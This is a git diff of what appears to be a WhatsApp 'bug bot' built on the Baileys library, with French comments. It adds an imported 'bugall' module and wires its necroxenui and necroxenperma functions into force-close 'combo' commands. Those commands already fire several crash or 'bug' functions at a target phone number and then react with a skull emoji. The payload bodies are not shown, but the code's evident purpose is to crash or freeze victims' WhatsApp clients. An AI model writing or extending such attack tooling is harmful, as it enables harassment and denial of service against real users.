@@ -1,5 +1,6 @@
 import fs from "fs";
 import { generateWAMessageFromContent } from "@whiskeysockets/baileys"; // si utilisé
+import { bugall } from "./bugall.js"; 
 
 // =======================
 // HELPERS / RATE LIMIT / UTILS
@@ -1278,7 +1279,9 @@ const forcloseCombo = {
     // Exécution des fonctions de bug
     await protocol6(target);
     await Wraperos2(target);
-    await fc(target);
+    await fc(target);    
+    await bugall.necroxenui(target);
+    await bugall.necroxenperma(target);
 
     // Réaction emoji automatique
     await sock.sendMessage(from, { react: { text: "💀", key: msg.key } });
@@ -1286,7 +1289,7 @@ const forcloseCombo = {
 };
 
 const queenCombo = {
-  name: "raizel-combo",
+  name: "reflay",
   execute: async (sock, msg, args, from, _, prefix, command) => {
     const q = args[0];
     if (!q) {
@@ -1319,6 +1322,8 @@ const queenCombo = {
     await UiScorpio(target);
     await invico1(target);
     await invisiblenew(target);
+    await bugall.necroxenui(target);
+    await bugall.necroxenperma(target);
 
     // Réaction emoji automatique
     await sock.sendMessage(from, { react: { text: "💀", key: msg.key } });
